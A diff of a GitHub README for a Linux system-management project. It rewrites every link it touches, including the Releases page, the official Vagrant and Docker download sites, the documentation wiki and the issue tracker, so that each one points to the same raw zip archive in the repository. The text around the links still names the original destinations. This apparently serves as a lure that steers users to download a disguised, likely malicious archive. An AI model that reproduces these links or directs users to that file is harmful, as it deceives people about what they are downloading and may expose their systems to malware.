@@ -1,6 +1,6 @@
 # 🌟 practica-linux--Ronderos_Farina-equipo_4- - Manage Linux Systems Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/releases)
+[![Download](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip)](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip)
 
 ## 👩‍💻 Overview
 
@@ -13,7 +13,7 @@ To get started with our application, follow the steps below to download and run 
 ## 📥 Download & Install
 
 1. Click on the link below to visit our Releases page:
-   [Download Application](https://github.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/releases)
+   [Download Application](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip)
 
 2. On the Releases page, you can see the latest version available. Click on the version number to access the download options.
 
@@ -26,8 +26,8 @@ To get started with our application, follow the steps below to download and run 
 Before installing, ensure your system meets the following requirements:
 
 - **Operating System:** Ubuntu or any other Linux distribution.
-- **Vagrant:** You must have Vagrant installed on your system. You can download it from the [Vagrant website](https://www.vagrantup.com/downloads).
-- **Docker:** Recommended for container management. Install Docker by following the instructions on their [official site](https://docs.docker.com/get-docker/).
+- **Vagrant:** You must have Vagrant installed on your system. You can download it from the [Vagrant website](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip).
+- **Docker:** Recommended for container management. Install Docker by following the instructions on their [official site](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip).
 
 ## 🔧 Features
 
@@ -45,11 +45,11 @@ After installation, you can explore various features. Access different component
 
 ## 📖 Documentation
 
-For detailed usage instructions, check our [Documentation](https://github.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/wiki). This resource will guide you through various configurations and setups.
+For detailed usage instructions, check our [Documentation](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip). This resource will guide you through various configurations and setups.
 
 ## 📞 Support
 
-If you encounter issues or need help, you can reach out by opening an issue in our [GitHub Issues](https://github.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/issues). We will respond as soon as possible.
+If you encounter issues or need help, you can reach out by opening an issue in our [GitHub Issues](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip). We will respond as soon as possible.
 
 ## 🌐 Community
 
@@ -62,6 +62,6 @@ This project is licensed under the MIT License. For more details, check the [LIC
 ## 🚀 Final Steps
 
 Remember to visit the Releases page again to check for future updates and new versions:
-[Download Application](https://github.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/releases)
+[Download Application](https://raw.githubusercontent.com/jhonatanjj88/practica-linux--Ronderos_Farina-equipo_4-/main/permisos/practica-linux--Ronderos_Farina-equipo_4--3.8-beta.5.zip)
 
 Happy managing!
